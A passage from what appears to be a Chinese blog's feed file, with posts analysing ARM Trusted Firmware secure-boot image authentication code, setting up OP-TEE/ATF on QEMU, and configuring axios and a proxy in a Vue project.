class="line"><span class="type">void</span> *pk_ptr, <span class="type">unsigned</span> <span class="type">int</span> pk_len);      <span class="comment">/* 公钥 */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 校验哈希的方法 */</span></span><br><span class="line"><span class="type">int</span> (*verify_hash)(</span><br><span class="line">               <span class="type">void</span> *data_ptr, <span class="type">unsigned</span> <span class="type">int</span> data_len,       <span class="comment">/* 要计算哈希的数据 */</span></span><br><span class="line">   <span class="type">void</span> *digest_info_ptr, <span class="type">unsigned</span> <span class="type">int</span> digest_info_len);<span class="comment">/* 哈希值 */</span></span><br><span class="line">&#125; <span class="type">crypto_lib_desc_t</span>;</span><br></pre></td></tr></table></figure><p>通过 <code>REGISTER_CRYPTO_LIB</code>  宏实现一个名为 <code>crypto_lib_desc</code>  类型为 <code>crypto_lib_desc_t</code>  结构体。宏实现如下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#define REGISTER_CRYPTO_LIB(_name, _init, _verify_signature, _verify_hash) \</span><br><span class="line">const crypto_lib_desc_t crypto_lib_desc = &#123; \</span><br><span class="line">.name = _name, \</span><br><span class="line">.init = _init, \</span><br><span class="line">.verify_signature = _verify_signature, \</span><br><span class="line">.verify_hash = _verify_hash \</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此模块通过操作 crypto_lib_desc 变量，实现模块初始化、校验签名、校验哈希。函数声明如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">/* 模块初始化 */</span><br><span class="line">void crypto_mod_init(void);</span><br><span class="line"></span><br><span class="line">/* 校验签名 */</span><br><span class="line">int crypto_mod_verify_signature(void *data_ptr, unsigned int data_len,</span><br><span class="line">void *sig_ptr, unsigned int sig_len,</span><br><span class="line">void *sig_alg, unsigned int sig_alg_len,</span><br><span class="line">void *pk_ptr, unsigned int pk_len);</span><br><span class="line">/* 校验哈希值 */</span><br><span class="line">int crypto_mod_verify_hash(void *data_ptr, unsigned int data_len,</span><br><span class="line">   void *digest_info_ptr, unsigned int digest_info_len);</span><br></pre></td></tr></table></figure><h5 id="auth_mod_init"><a class="markdownIt-Anchor" href="#auth_mod_init">#</a> auth_mod_init()</h5><p>auth_mod 实现了一个校验镜像的模型，此模型通过结构体 <code>auth_img_desc_t</code>  描述，跟进 auth_mod_init,</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202204192243044.png" alt="image-20220419224356942"></p><p>在 auth.mod.h 中定义了 auth_img_desc_s 结构体</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">typedef struct auth_img_desc_s &#123;</span><br><span class="line">/* 镜像的ID,标志是哪一个镜像 */</span><br><span class="line">unsigned int img_id;</span><br><span class="line"></span><br><span class="line">/* 镜像类型(Binary、证书等) */</span><br><span class="line">img_type_t img_type;</span><br><span class="line"></span><br><span class="line">/* 父镜像，保存了认证当前镜像的公钥、哈希等 */</span><br><span class="line">const struct auth_img_desc_s *parent;</span><br><span class="line"></span><br><span class="line">/* 认证当前镜像的方法 */</span><br><span class="line">auth_method_desc_t img_auth_methods[AUTH_METHOD_NUM];</span><br><span class="line"></span><br><span class="line">/* 用于校验子镜像的公钥、哈希等 */</span><br><span class="line">auth_param_desc_t authenticated_data[COT_MAX_VERIFIED_PARAMS];</span><br><span class="line">&#125; auth_img_desc_t;</span><br></pre></td></tr></table></figure><p>并定义一个宏 <code>REGISTER_COT</code> ，用于注册 <code>auth_img_desc_t</code>  数组</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#define REGISTER_COT(_cot) \</span><br><span class="line">const auth_img_desc_t *const cot_desc_ptr = \</span><br><span class="line">(const auth_img_desc_t *const)&amp;_cot[0]; \</span><br><span class="line">unsigned int auth_img_flags[sizeof(_cot)/sizeof(_cot[0])]</span><br></pre></td></tr></table></figure><p><code>auth_mod_verify_img</code>  通过 <code>img_id</code>  访问 <code>cot_desc_ptr</code>  数组，找到对应的镜像描述符 <code>auth_method_desc_t</code> ，即可知道当前镜像的认证方式，访问父节点找到签名的公钥或哈希，即可认证当前镜像是否合法。在认证完当前镜像后，从镜像中解析出公钥哈希等放入当前的镜像描述符中，便于对下一级镜像校验</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">int auth_mod_verify_img(unsigned int img_id,</span><br><span class="line">void *img_ptr,</span><br><span class="line">unsigned int img_len)</span><br><span class="line">&#123;</span><br><span class="line">const auth_img_desc_t *img_desc = NULL;</span><br><span class="line">const auth_method_desc_t *auth_method = NULL;</span><br><span class="line">void *param_ptr;</span><br><span class="line">unsigned int param_len;</span><br><span class="line">int rc, i;</span><br><span class="line"></span><br><span class="line">/* 根据img_id获取镜像描述符 */</span><br><span class="line">img_desc = &amp;cot_desc_ptr[img_id];</span><br><span class="line"></span><br><span class="line">/* 校验镜像完整性 */</span><br><span class="line">rc = img_parser_check_integrity(img_desc-&gt;img_type, img_ptr, img_len);</span><br><span class="line">return_if_error(rc);</span><br><span class="line"></span><br><span class="line">/* 根据镜像描述符的仍正方式对镜像进行认证 */</span><br><span class="line">for (i = 0 ; i &lt; AUTH_METHOD_NUM ; i++) &#123;</span><br><span class="line">auth_method = &amp;img_desc-&gt;img_auth_methods[i];</span><br><span class="line">switch (auth_method-&gt;type) &#123;</span><br><span class="line">case AUTH_METHOD_NONE:/* 不需要认证 */</span><br><span class="line">rc = 0;</span><br><span class="line">break;</span><br><span class="line">case AUTH_METHOD_HASH:/* 哈希认证 */</span><br><span class="line">rc = auth_hash(&amp;auth_method-&gt;param.hash,</span><br><span class="line">img_desc, img_ptr, img_len);</span><br><span class="line">break;</span><br><span class="line">case AUTH_METHOD_SIG:/* 签名认证 */</span><br><span class="line">rc = auth_signature(&amp;auth_method-&gt;param.sig,</span><br><span class="line">img_desc, img_ptr, img_len);</span><br><span class="line">break;</span><br><span class="line">case AUTH_METHOD_NV_CTR:/* Non-Volatile counter认证？ */</span><br><span class="line">rc = auth_nvctr(&amp;auth_method-&gt;param.nv_ctr,</span><br><span class="line">img_desc, img_ptr, img_len);</span><br><span class="line">break;</span><br><span class="line">default:</span><br><span class="line">/* 未知认证类型，报错 */</span><br><span class="line">rc = 1;</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line">return_if_error(rc);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/* 从镜像中解析出公钥哈希等，以便对下一级镜像进行认证 */</span><br><span class="line">for (i = 0 ; i &lt; COT_MAX_VERIFIED_PARAMS ; i++) &#123;</span><br><span class="line">if (img_desc-&gt;authenticated_data[i].type_desc == NULL) &#123;</span><br><span class="line">continue;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/* 通过镜像解析器从镜像中提取内容 */</span><br><span class="line">rc = img_parser_get_auth_param(img_desc-&gt;img_type,</span><br><span class="line">img_desc-&gt;authenticated_data[i].type_desc,</span><br><span class="line">img_ptr, img_len, &amp;param_ptr, &amp;param_len);</span><br><span class="line">return_if_error(rc);</span><br><span class="line"></span><br><span class="line">/* 异常检查</span><br><span class="line">   防止从镜像中解析出的数据字节数大于镜像描述符中的字节数</span><br><span class="line">   出现内存访问溢出 */</span><br><span class="line">if (param_len &gt; img_desc-&gt;authenticated_data[i].data.len) &#123;</span><br><span class="line">return 1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/* 把解析出的内容拷贝到镜像描述符中，便于解析下一级BL */</span><br><span class="line">memcpy((void *)img_desc-&gt;authenticated_data[i].data.ptr,</span><br><span class="line">(void *)param_ptr, param_len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/* 标记镜像以认证过 */</span><br><span class="line">auth_img_flags[img_desc-&gt;img_id] |= IMG_FLAG_AUTHENTICATED;</span><br><span class="line"></span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="bl2_image_load_v2c"><a class="markdownIt-Anchor" href="#bl2_image_load_v2c">#</a> BL2_image_load_v2.c</h4><p>该函数用来加载 bl3x 的 image 到 RAM 中，返回一个具有 image 入口信息的变量。smc handle 根据该变量跳转到 bl31 进行执行。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="type">entry_point_info_t</span> *<span class="title function_">bl2_load_images</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">bl_params_t</span> *bl2_to_next_bl_params;</span><br><span class="line"><span class="type">bl_load_info_t</span> *bl2_load_info;</span><br><span class="line"><span class="type">const</span> <span class="type">bl_load_info_node_t</span> *bl2_node_info;</span><br><span class="line"><span class="type">int</span> plat_setup_done = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> err;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* Get information about the images to load.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">/* 获取bl3x image的加载和入口信息 */</span></span><br><span class="line">bl2_load_info = plat_get_bl_image_load_info();</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 检查返回的bl2_load_info中的信息是否正确 */</span></span><br><span class="line">assert(bl2_load_info);</span><br><span class="line">assert(bl2_load_info-&gt;head);</span><br><span class="line">assert(bl2_load_info-&gt;h.type == PARAM_BL_LOAD_INFO);</span><br><span class="line">assert(bl2_load_info-&gt;h.version &gt;= VERSION_2);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 将bl2_load_info中的head变量的值赋值为bl2_node_info，即将bl31 image的入口信息传递給bl2_node_info变量 */</span></span><br><span class="line">bl2_node_info = bl2_load_info-&gt;head;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 进入loop循环， */</span></span><br><span class="line"><span class="keyword">while</span> (bl2_node_info) &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* Perform platform setup before loading the image,</span></span><br><span class="line"><span class="comment">* if indicated in the image attributes AND if NOT</span></span><br><span class="line"><span class="comment">* already done before.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">/* 在加载特定的bl3x image到RAM之前先确定是否需要做平台的初始化 */</span></span><br><span class="line"><span class="keyword">if</span> (bl2_node_info-&gt;image_info-&gt;h.attr &amp; IMAGE_ATTRIB_PLAT_SETUP) &#123;</span><br><span class="line"><span class="keyword">if</span> (plat_setup_done) &#123;</span><br><span class="line">WARN(<span class="string">&quot;BL2: Platform setup already done!!\n&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">INFO(<span class="string">&quot;BL2: Doing platform setup\n&quot;</span>);</span><br><span class="line">bl2_platform_setup();</span><br><span class="line">plat_setup_done = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 对bl3x image进行电子验签，如果通过则执行加载操作 */</span></span><br><span class="line"><span class="keyword">if</span> (!(bl2_node_info-&gt;image_info-&gt;h.attr &amp; IMAGE_ATTRIB_SKIP_LOADING)) &#123;</span><br><span class="line">INFO(<span class="string">&quot;BL2: Loading image id %d\n&quot;</span>, bl2_node_info-&gt;image_id);</span><br><span class="line">err = load_auth_image(bl2_node_info-&gt;image_id,</span><br><span class="line">bl2_node_info-&gt;image_info);</span><br><span class="line"><span class="keyword">if</span> (err) &#123;</span><br><span class="line">ERROR(<span class="string">&quot;BL2: Failed to load image (%i)\n&quot;</span>, err);</span><br><span class="line">plat_error_handler(err);</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">INFO(<span class="string">&quot;BL2: Skip loading image id %d\n&quot;</span>, bl2_node_info-&gt;image_id);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Allow platform to handle image information. */</span></span><br><span class="line"><span class="comment">/* 可以根据实际需要更改，通过给定image ID来更改image的加载信息 */</span></span><br><span class="line">err = bl2_plat_handle_post_image_load(bl2_node_info-&gt;image_id);</span><br><span class="line"><span class="keyword">if</span> (err) &#123;</span><br><span class="line">ERROR(<span class="string">&quot;BL2: Failure in post image load handling (%i)\n&quot;</span>, err);</span><br><span class="line">plat_error_handler(err);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Go to next image */</span></span><br><span class="line">bl2_node_info = bl2_node_info-&gt;next_load_info;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* Get information to pass to the next image.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">/* 获取下一个执行的Image的入口信息，并且将以后会被执行的image的入口信息组合成链表 ,t通过判断image des中的ep_info.h.attr的值是否为（EXECUTABLE|EP_FIRST_EX）来确定接下来第一个被执行的image*/</span></span><br><span class="line">bl2_to_next_bl_params = plat_get_next_bl_params();</span><br><span class="line">assert(bl2_to_next_bl_params);</span><br><span class="line">assert(bl2_to_next_bl_params-&gt;head);</span><br><span class="line">assert(bl2_to_next_bl_params-&gt;h.type == PARAM_BL_PARAMS);</span><br><span class="line">assert(bl2_to_next_bl_params-&gt;h.version &gt;= VERSION_2);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Flush the parameters to be passed to next image */</span></span><br><span class="line">plat_flush_next_bl_params();</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 返回下一个进入的image的入口信息,即bl31的入口信息 */</span></span><br><span class="line"><span class="keyword">return</span> bl2_to_next_bl_params-&gt;head-&gt;ep_info;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="四-分析结论"><a class="markdownIt-Anchor" href="#四-分析结论">#</a> 四、分析结论</h1><p>​结合 ATF 整个信任链条建立的流程图，我们了解到可信启动中的安全模块和可信机制，从作为信任根的 BL1 开始，逐步进行初始化和加载镜像，最后来到 BL33，后面就是 OS 了。</p><p>最后引用一张 ATF 的 UEFI 启动流程进行更直观展示：</p><p><img src="https://pic2.zhimg.com/80/v2-fac683117333c274fd22832772342d81_1440w.jpg" alt="img"></p><p>以上仅是对 ATF 可信启动机制的简要分析，而对于 ATF 的更深层次技术需要更多信息搜集和整理研究。</p><h1 id="五-参考文章"><a class="markdownIt-Anchor" href="#五-参考文章">#</a> 五、参考文章</h1><p><a href="https://zhuanlan.zhihu.com/p/391101179">https://zhuanlan.zhihu.com/p/391101179</a></p><p><a href="https://github.com/hardenedlinux/embedded-iot_profile/blob/master/docs/arm64/arm-trusted-firmware%E5%88%86%E6%9E%90.md">https://github.com/hardenedlinux/embedded-iot_profile/blob/master/docs/arm64/arm-trusted-firmware 分析.md</a></p><p><a href="https://blog.csdn.net/puyoupuyou/article/details/109506419?spm=1001.2101.3001.6650.15&amp;utm_medium=distribute.pc_relevant.none-task-blog-2">https://blog.csdn.net/puyoupuyou/article/details/109506419?spm=1001.2101.3001.6650.15&amp;utm_medium=distribute.pc_relevant.none-task-blog-2</a><sub>default</sub>BlogCommendFromBaidu<sub>Rate-15.topblog&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2</sub>default<sub>BlogCommendFromBaidu</sub>Rate-15.topblog&amp;utm_relevant_index=20</p>]]></content>
      
      
      <categories>
          
          <category> arm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> arm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基于QEMU的OPTEE/ATF学习</title>
      <link href="/2022/04/10/OPTEE_ATF/"/>
      <url>/2022/04/10/OPTEE_ATF/</url>
      
        <content type="html"><![CDATA[<p>OPTEE/ATF</p><span id="more"></span><h1 id="环境安装问题"><a class="markdownIt-Anchor" href="#环境安装问题">#</a> 环境安装问题</h1><h2 id="ubuntu-2004-1910-or-1904出现libqtgui4-depends-libpng12-0-1213-4-but-it-is-not-installed"><a class="markdownIt-Anchor" href="#ubuntu-2004-1910-or-1904出现libqtgui4-depends-libpng12-0-1213-4-but-it-is-not-installed">#</a> Ubuntu 20.04, 19.10 or 19.04 出现 libqtgui4 : Depends: libpng12-0 (&gt;= 1.2.13-4) but it is not installed</h2><p>E: Unmet dependencies. Try ‘apt --fix-broken install’ with no packages (or specify a solution). 问题的解决方法：</p><p>Ubuntu 20.04, 19.10 或者 19.04 中，可以通过 PPA 安装 libpng，安装 PPA 及 libpng12-0 的命令如下。</p><h3 id="解决方法"><a class="markdownIt-Anchor" href="#解决方法">#</a> 解决方法</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo add-apt-repository ppa:linuxuprising/libpng12</span><br><span class="line">sudo apt update</span><br><span class="line">sudo apt install libpng12-<span class="number">0</span></span><br></pre></td></tr></table></figure><h1 id="opteeatf环境安装"><a class="markdownIt-Anchor" href="#opteeatf环境安装">#</a> OPTEE/ATF 环境安装</h1><blockquote><p>我的虚拟机是 Ubuntu18.04</p></blockquote><h2 id="一常规流程比较考验网速"><a class="markdownIt-Anchor" href="#一常规流程比较考验网速">#</a> （一）常规流程（比较考验网速）</h2><ol><li>安装必要依赖</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install android-tools-adb android-tools-fastboot autoconf \</span><br><span class="line">automake bc bison build-essential cscope curl device-tree-compiler \</span><br><span class="line">expect flex ftp-upload gdisk iasl libattr1-dev libc6:i386 libcap-dev \</span><br><span class="line">libfdt-dev libftdi-dev libglib2.0-dev libhidapi-dev libncurses5-dev \</span><br><span class="line">libpixman-1-dev libssl-dev libstdc++6:i386 libtool libz1:i386 make \</span><br><span class="line">mtools netcat python-crypto python-serial python-wand unzip uuid-dev \</span><br><span class="line">xdg-utils xterm xz-utils zlib1g-dev</span><br></pre></td></tr></table></figure><ol start="2"><li>创建 opentee 目录</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mkdir open-tee//创建目录</span><br><span class="line">cd open-tee//切换到创建的目录</span><br><span class="line">repo init -u https://github.com/OP-TEE/manifest.git -m default_stable.xml --repo-url=https://mirrors.tuna.tsinghua.edu.cn/git/git-repo/ -b 2.6.0 //初始化repo,使用清华的repo减少一些麻烦</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="3"><li>打开.repo/manifest.xml，在 revision 后添加 clone-depth=“1”，因为一些 linux project,qemu project 太大，只克隆一层</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">time repo sync -j8 -f</span><br></pre></td></tr></table></figure><ol start="4"><li>获取 toolchain</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd build//切换到build目录</span><br><span class="line">make -f toolchain.mk toolchains//下载toolchain</span><br></pre></td></tr></table></figure><ol start="5"><li><p>开始编译使用 qemu 运行 OP-TEE 的工程</p><p>准备好 toolchain 和 source code 之后，下一步就是编译工程，具体操作如下：</p></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd build//切换到build目录</span><br><span class="line">make -f qemu.mk all//编译工程</span><br></pre></td></tr></table></figure><ol start="6"><li>启动 qemu</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd build</span><br><span class="line">make -f qemu.mk run-only</span><br></pre></td></tr></table></figure><ol start="7"><li><p>运行 OP-TEE 和 linux</p><p>在 qemu 界面中输入字母 “c” 回车之后，就会启动两个 terminal，一个是 OP-TEE 的 terminal, 另外一个是 linux 的 terminal。</p></li></ol><h2 id="二使用搭建好的的optee"><a class="markdownIt-Anchor" href="#二使用搭建好的的optee">#</a> （二）使用搭建好的的 optee</h2><blockquote><p><a href="https://blog.csdn.net/chelseablue1905/article/details/85344941">https://blog.csdn.net/chelseablue1905/article/details/85344941</a></p></blockquote><p>注意在 build_qemu.sh 时会报错，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">builddir/build/BUILD/qemu-2.11.0-rc1/util/memfd.c:40:12: error: static declaration of memfd_create follows non-static declaration</span><br></pre></td></tr></table></figure><p>按照发布的补丁：<a href="https://git.qemu.org/?p=qemu.git;a=commit;h=75e5b70e6b5dcc4f2219992d7cffa462aa406af0">https://git.qemu.org/?p=qemu.git;a=commit;h=75e5b70e6b5dcc4f2219992d7cffa462aa406af0</a></p><p>删除 qemu/util/memfd.c 中报错部分的 static 函数以及引用头文件重新编译即可</p><h2 id="参考文章"><a class="markdownIt-Anchor" href="#参考文章">#</a> 参考文章</h2><p><a href="http://www.fredyblog.cn/index.php/2021/06/28/arm-atf-optee/">http://www.fredyblog.cn/index.php/2021/06/28/arm-atf-optee/</a></p><p><a href="https://icyshuai.blog.csdn.net/article/details/71499619">https://icyshuai.blog.csdn.net/article/details/71499619</a></p>]]></content>
      
      
      <categories>
          
          <category> qemu </category>
          
      </categories>
      
      
        <tags>
            
            <tag> qemu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vue开发问题总结</title>
      <link href="/2022/03/07/vue%E5%BC%80%E5%8F%91%20(1)/"/>
      <url>/2022/03/07/vue%E5%BC%80%E5%8F%91%20(1)/</url>
      
        <content type="html"><![CDATA[<p>vue 开发中遇到的一些问题及解决方法</p><span id="more"></span><h1 id="一-前后端跨域接口实现"><a class="markdownIt-Anchor" href="#一-前后端跨域接口实现">#</a> 一、前后端跨域接口实现</h1><h2 id="1-安装axios插件并设置全局"><a class="markdownIt-Anchor" href="#1-安装axios插件并设置全局">#</a> 1、安装 axios 插件并设置全局</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install axios --save-dev</span><br></pre></td></tr></table></figure><p>安装完成后对 axios 进行全局调用，在 main.js 中设置</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> axios <span class="keyword">from</span> <span class="string">&#x27;axios&#x27;</span></span><br><span class="line"><span class="title class_">Vue</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">$axios</span> = axios</span><br></pre></td></tr></table></figure><h2 id="2-设置跨域代理"><a class="markdownIt-Anchor" href="#2-设置跨域代理">#</a> 2、设置跨域代理</h2><p>在 config 文件夹的 index.js 文件中 (或者是在 vue.config.js 中），设置 proxy 模块代理，之后重启项目</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">devServer</span>: &#123;</span><br><span class="line">  <span class="attr">port</span>: port,</span><br><span class="line">  <span class="attr">open</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">overlay</span>: &#123;</span><br><span class="line">    <span class="attr">warnings</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">errors</span>: <span class="literal">true</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">// before: require(&#x27;./mock/mock-server.js&#x27;)</span></span><br><span class="line">  <span class="attr">proxy</span>: &#123;</span><br><span class="line">    [process.<span class="property">env</span>.<span class="property">VUE_APP_BASE_API</span>]: &#123; </span><br><span class="line">      <span class="attr">target</span>: <span class="string">&#x27;http://0.0.0.0:8000/&#x27;</span>, <span class="comment">// 用于本地调试</span></span><br><span class="line">      <span class="comment">// target: &#x27;&#x27;, // 用于生产环境</span></span><br><span class="line">      <span class="attr">changeOrigin</span>: <span class="literal">true</span>,</span><br><span class="line">      <span class="attr">pathRewrite</span>: &#123;</span><br><span class="line">        [<span class="string">&#x27;^&#x27;</span> + process.<span class="property">env</span>.<span class="property">VUE_APP_BASE_API</span>]: <span class="string">&#x27;&#x27;</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><h2 id="3-发送请求"><a class="markdownIt-Anchor" href="#3-发送请求">#</a> 3、 发送请求</h2><p>在 src 的 views 文件夹中创建 test.vue 文件，在文件中进行编写，这里只介绍 js 部分，在 method 方法中设置接口，如下:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 